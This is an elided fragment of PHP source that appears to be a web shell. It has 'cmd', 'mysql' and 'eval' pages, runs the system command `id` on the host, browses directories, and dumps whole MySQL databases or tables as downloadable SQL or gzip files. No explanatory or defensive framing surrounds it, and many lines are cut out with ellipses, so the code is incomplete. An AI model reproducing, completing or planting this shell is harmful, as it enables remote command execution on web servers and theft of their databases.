...
$page = '' == $page || ('cmd' != $page && 'mysql' != $page && 'eval' != $page) ? 'cmd' : $page;
$winda = strpos(strtolower(php_uname()), 'wind');
define('format', 50);
$pages = '<center>###<a href=\'' . basename(__FILE__) . '\'>cmd</a>###<a href=\'' . basename(__FILE__) . '?mysql\'>mysql</a>###<a href=\'' . basename(__FILE__) . '?eval\'>eval</a>###</center>' . (false === $winda ? 'id :' . `id` : '');
switch ($page) {
case 'eval':
...
if (@is_dir($work_dir)) {
    ...
    if ('' == $work_dir) {
        $work_dir = '/';
    } elseif (!('/' == $work_dir[strlen($work_dir) - 1] || '\\' == $work_dir[strlen($work_dir) - 1])) {
        $work_dir .= '/';
    }
} elseif (file_exists($work_dir)) {
...
if (!($mysql_link)) {
    ...
    if (!(@mysql_select_db($db_dump, $mysql_link))) {
        ...
        if ('' == $table_dump) {
            if (!$to_file) {
                header('Content-Type: application/x-' . ('none' == $archive ? 'octet-stream' : 'gzip') . "\n");
                header("Content-Disposition: attachment; filename=\"dump_{$db_dump}.sql" . ('none' == $archive ? '' : '.gz') . "\"\n\n");
            }
            ...
            for ($i = 0; $i < mysql_num_rows($result); ++$i) {
                ...
                if (!$result2) {
                    ...
                    for ($j = 0; $j < mysql_num_rows($result2) - 1; ++$j) {
                        ...
                        $dump_file .= '`' . $rows2[0] . '` ' . $rows2[1] . ('NO' == $rows2[2] && 'NULL' != $rows2[4] ? ' NOT NULL DEFAULT \'' . $rows2[4] . '\'' : ' DEFAULT NULL') . ",\n";
                    }
                    $rows2 = mysql_fetch_array($result2);
                    $dump_file .= '`' . $rows2[0] . '` ' . $rows2[1] . ('NO' == $rows2[2] && 'NULL' != $rows2[4] ? ' NOT NULL DEFAULT \'' . $rows2[4] . '\'' : ' DEFAULT NULL') . "\n";
                    $type[$j] = $rows2[1];
            ...
            if (!$result2) {
                ...
                if (false === $to_file) {
                    header('Content-Type: application/x-' . ('none' == $archive ? 'octet-stream' : 'gzip') . "\n");
                    header("Content-Disposition: attachment; filename=\"dump_{$db_dump}_${table_dump}.sql" . ('none' == $archive ? '' : '.gz') . "\"\n\n");
                }
